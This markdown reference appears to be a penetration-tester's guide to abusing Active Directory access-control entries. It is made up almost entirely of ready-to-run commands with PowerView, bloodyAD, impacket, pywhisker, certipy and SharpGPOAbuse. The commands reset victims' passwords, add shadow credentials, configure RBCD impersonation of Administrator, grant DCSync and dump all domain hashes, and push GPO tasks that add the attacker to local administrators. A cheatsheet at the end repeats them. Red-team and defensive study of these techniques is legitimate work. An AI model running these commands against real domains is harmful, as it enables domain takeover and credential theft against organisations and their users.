# Active Directory ACL / DACL Abuse

Deep reference for abusing object permissions (DACLs/ACEs) in Active Directory: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf/AddMember, GPO abuse, and granting DCSync rights. ACL paths are what BloodHound highlights most — this file is the "how to walk the edge" companion. See `ad-enumeration-and-attacks.md`, `kerberos-attacks.md`, and `bloodhound-and-recon.md`.

---

## 1. Enumerate Who Has Rights Over What

```powershell
# PowerView — find interesting ACLs your principal holds over others
Find-InterestingDomainAcl -ResolveGUIDs |
  ? { $_.IdentityReferenceName -eq "$env:USERNAME" } |
  select ObjectDN, ActiveDirectoryRights, IdentityReferenceName

# ACEs on a specific object
Get-DomainObjectAcl -Identity "TargetUser" -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteOwner|WriteDacl|WriteProperty|ExtendedRight' }

# Map a SID back to a name
Convert-SidToName <SID>
```
```bash
# Linux: dump ACLs / find your edges
nxc ldap <DC_IP> -u user -p pass -M daclread -o TARGET=TargetUser ACTION=read
bloodyAD -d domain.local -u user -p pass --host <DC_IP> get writable        # objects you can write
```
> BloodHound is the practical way to find these — the "Outbound Object Control" tab of a node you own shows every ACL edge.

### Right → primitive map
| ACE on target | What it gives you |
|---------------|-------------------|
| **GenericAll** | everything below (reset pw, add member, set SPN/keycred/RBCD) |
| **GenericWrite / WriteProperty** | set SPN (targeted kerberoast), set msDS-KeyCredentialLink (shadow creds), set RBCD, set logon script |
| **WriteDACL** | add a new ACE granting yourself GenericAll (or DCSync on domain) |
| **WriteOwner** | set yourself as owner → then WriteDACL → GenericAll |
| **User-Force-Change-Password / ForceChangePassword** | reset the target's password (no old pw) |
| **Self / AddSelf** (on a group) | add yourself as a member |
| **AllExtendedRights** (on user) | reset password; (on domain) DCSync |
| **GetChanges + GetChangesAll** (domain) | **DCSync** |
| **Owns / WriteOwner on GPO**, link rights | GPO abuse → SYSTEM on linked OUs |

---

## 2. Exploiting Each Right

### 2.1 GenericAll / GenericWrite on a USER
Multiple options — pick the stealthiest your target DFL allows.
```bash
# (a) Shadow Credentials (no password change — preferred, reversible). DFL 2016+, CA present.
pywhisker -d domain.local -u attacker -p pass --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC_IP>             # → victim TGT + NT hash

# (b) Targeted Kerberoast (set a temp SPN, roast, crack, revert)
impacket-targetedKerberoast -d domain.local -u attacker -p pass --dc-ip <DC_IP>

# (c) Force password reset (loud, breaks the account for the user)
impacket-changepasswd domain.local/victim@<DC_IP> -newpass 'NewPass1!' -reset -altuser domain.local/attacker -altpass pass
net rpc password victim 'NewPass1!' -U domain.local/attacker%pass -S <DC_IP>
```
```powershell
# PowerView force reset
$p = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $p
# PowerView set SPN for targeted kerberoast
Set-DomainObject -Identity victim -Set @{serviceprincipalname='nonexistent/svc'}
```

### 2.2 GenericAll / GenericWrite on a COMPUTER
```bash
# RBCD: set msDS-AllowedToActOnBehalfOfOtherIdentity → impersonate any user to it
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/attacker:pass -dc-ip <DC_IP>
impacket-getST -spn cifs/target.domain.local -impersonate Administrator 'domain.local/EVIL$:Passw0rd!' -dc-ip <DC_IP>
# OR Shadow Credentials on the computer:
pywhisker -d domain.local -u attacker -p pass --target 'TARGET$' --action add
certipy auth -pfx target.pfx -dc-ip <DC_IP>            # → TARGET$ TGT → silver/secrets
```

### 2.3 GenericAll / Self / AddMember on a GROUP
```bash
# Add yourself (or a controlled user) to the group
net rpc group addmem "TargetGroup" attacker -U domain.local/attacker%pass -S <DC_IP>
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> add groupMember "TargetGroup" attacker
```
```powershell
Add-DomainGroupMember -Identity 'TargetGroup' -Members attacker        # PowerView
net group "TargetGroup" attacker /add /domain
```
If the group is privileged (e.g. **Account Operators → reset most users**, or a group with delegated rights), chain onward.

### 2.4 WriteDACL on an object (or the domain)
Grant yourself full control, or **DCSync** if on the domain object.
```powershell
# Give yourself GenericAll on a target
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -Rights All
# Grant DCSync (replication) rights on the domain → then secretsdump -just-dc
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync
```
```bash
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> add dcsync attacker
# then:
impacket-secretsdump domain.local/attacker:pass@<DC_IP> -just-dc
```

### 2.5 WriteOwner on an object
```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker     # become owner
Add-DomainObjectAcl  -TargetIdentity victim -PrincipalIdentity attacker -Rights All   # then grant rights
```
```bash
bloodyAD -d domain.local -u attacker -p pass --host <DC_IP> set owner victim attacker
```

### 2.6 ForceChangePassword
```bash
net rpc password victim 'NewP@ss1!' -U domain.local/attacker%pass -S <DC_IP>
```

### 2.7 GPO abuse (edit a GPO you can write → SYSTEM on linked machines)
```bash
# Find writable GPOs / who they apply to
nxc ldap <DC_IP> -u user -p pass -M gpp_password        # legacy cpassword in SYSVOL
# Abuse with pyGPOAbuse / SharpGPOAbuse: add a computer startup script or immediate scheduled task
pygpoabuse domain.local/attacker:pass -gpo-id <GPO_GUID> -command 'net localgroup administrators attacker /add'
```
```powershell
# SharpGPOAbuse (Windows)
SharpGPOAbuse.exe --AddComputerTask --TaskName "u" --Author dom\a --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "VulnGPO"
gpupdate /force   # on target, or wait for refresh
```

---

## 3. Common ACL Chains (what BloodHound paths look like)

```
You ──GenericWrite──▶ victimUser ──MemberOf──▶ Help Desk ──ForceChangePassword──▶ DA-candidate
You ──WriteDACL──▶ Domain ──(add DCSync)──▶ krbtgt hash ──▶ Golden Ticket
You ──GenericAll──▶ WS01$ ──(RBCD)──▶ impersonate DA to WS01 ──▶ local SYSTEM ──▶ harvest creds
You ──Owns──▶ GPO ──LinkedTo──▶ Servers OU ──▶ SYSTEM on every server
You ──AddSelf──▶ Backup Operators ──SeBackup──▶ read NTDS.dit ──▶ all hashes
```
Always **mark owned** in BloodHound and re-run "Shortest paths from owned principals to Domain Admins" after each hop.

---

## 4. Cheatsheet

```bash
# ENUM (Linux)
bloodyAD -d dom -u u -p p --host <DC> get writable
nxc ldap <DC> -u u -p p -M daclread -o TARGET=victim ACTION=read

# GenericWrite/All on USER → shadow creds (preferred)
pywhisker -d dom -u u -p p --target victim --action add
certipy auth -pfx victim.pfx -dc-ip <DC>

# Force pw reset
net rpc password victim 'New1!' -U dom/u%p -S <DC>

# Add to group
bloodyAD -d dom -u u -p p --host <DC> add groupMember "Group" u

# WriteDACL → DCSync
bloodyAD -d dom -u u -p p --host <DC> add dcsync u
impacket-secretsdump dom/u:p@<DC> -just-dc

# WriteOwner → own → grant
bloodyAD -d dom -u u -p p --host <DC> set owner victim u

# Computer GenericWrite → RBCD
impacket-rbcd -delegate-from EVIL$ -delegate-to TARGET$ -action write dom/u:p -dc-ip <DC>
```

---

## References

- The Hacker Recipes – DACL/ACL abuse — https://www.thehacker.recipes/ad/movement/dacl/
- HackTricks – ACL persistence/abuse — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
- bloodyAD — https://github.com/CravateRouge/bloodyAD
- PowerView (Set/Add-DomainObjectAcl) — https://powersploit.readthedocs.io/en/latest/Recon/
- SharpGPOAbuse — https://github.com/FSecureLABS/SharpGPOAbuse
- pyGPOAbuse — https://github.com/Hackndo/pyGPOAbuse
- SpecterOps – An ACE Up the Sleeve — https://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf
